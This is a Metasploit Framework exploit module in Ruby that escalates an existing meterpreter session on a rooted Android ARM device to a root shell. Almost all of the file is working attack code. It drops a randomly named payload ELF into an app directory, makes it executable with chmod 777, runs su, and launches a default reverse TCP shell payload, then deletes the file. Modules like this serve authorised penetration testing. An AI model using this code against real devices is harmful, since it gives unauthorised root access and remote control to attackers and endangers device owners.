##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'


class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'Android Rooted Device Escalation Exploit',
        'Description'   => %q{
          This module abuses an already rooted device to get back a root shell.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'timwr' ],
        'DisclosureDate' => 'Oct 11 2013',
        'Platform'      => %w{ linux },
        'SessionTypes'  => [ 'meterpreter' ],
        'Targets'       =>
          [
            [ 'ARM Device', { 'Arch' => ARCH_ARMLE } ]
          ],
        'DefaultOptions' =>
          {
            "WfsDelay" => 2,
            'PAYLOAD'  => 'linux/armle/shell_reverse_tcp',
            'SHELL'    => '/system/bin/sh',
            'SHELLARG' => '-c'
          },
        'DefaultTarget' => 0
      }
    ))

    register_options([
        # These are not OptPath becuase it's a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/data/data/com.metasploit.stage/files" ]),
        OptString.new("su",          [ true, "Path to su executable", "/system/xbin/su" ]),
      ], self.class)
  end

  def check
    if file?(datastore["su"])
      return CheckCode::Detected
    end

    return CheckCode::Unknown
  end

  def exploit
    @elf = "#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.elf"

    print_status("Dropping payload to #{@elf}...")
    write_file(@elf, generate_payload_exe)

    print_status("Setting #{@elf} as executable...")
    cmd_exec("chmod 777 #{@elf}")

    process = session.sys.process.execute("sh", "", {'Channelized' => true})
    print_status("Running su...")
    process.channel.write("#{datastore["su"]}\n")
    process.channel.read
    print_status("Running the payload...")
    process.channel.write("#{@elf}\n")
  end

  def cleanup
    super
    print_status("Deleting #{@elf}...")
    cmd_exec("rm #{@elf}")
  end

end

